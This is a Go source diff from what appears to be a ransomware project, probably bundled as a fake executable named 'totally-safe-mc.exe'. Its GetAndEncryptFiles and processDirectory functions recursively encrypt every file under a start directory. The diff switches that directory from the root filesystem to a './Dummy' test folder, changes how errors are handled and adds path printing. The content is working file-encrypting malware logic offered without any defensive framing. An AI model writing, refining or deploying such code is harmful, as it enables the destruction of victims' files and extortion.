@@ -8,7 +8,7 @@ import (
 )
 
 func GetAndEncryptFiles(key string) (bool, error) {
-	startDir := "/"
+	startDir := "./Dummy"
 	err := processDirectory(key, startDir)
 	if err != nil {
 		return false, err
@@ -18,6 +18,7 @@ func GetAndEncryptFiles(key string) (bool, error) {
 
 func EncryptFile(key string, filePath string) error {
 	// Read the file contents and start encryption
+
 	fileData, err := os.ReadFile(filePath)
 	if err != nil {
 		return err
@@ -57,9 +58,10 @@ func processDirectory(key string, dirPath string) error {
 		}
 		if err.Error() == "bad file descriptor" {
 			// log.Printf("skipping directory %s due to bad file descriptor error: %v", dirPath, err)
+			return nil
 		} else {
 			// log.Printf("error reading directory %s: %v", dirPath, err)
-			return nil
+			return err
 		}
 	}
 	for _, file := range getFiles {
@@ -87,8 +89,10 @@ func processDirectory(key string, dirPath string) error {
 				file.Name() == "totally-safe-mc.exe" {
 				continue
 			}
-			// fmt.Println(filePath)
+			// fmt.Println(file.IsDir())
+			fmt.Println(filePath)
 			err := EncryptFile(key, filePath)
+
 			if err != nil {
 				if os.IsPermission(err) {
 					// log.Printf("skipping file %s due to permission denied error: %v", filePath, err)
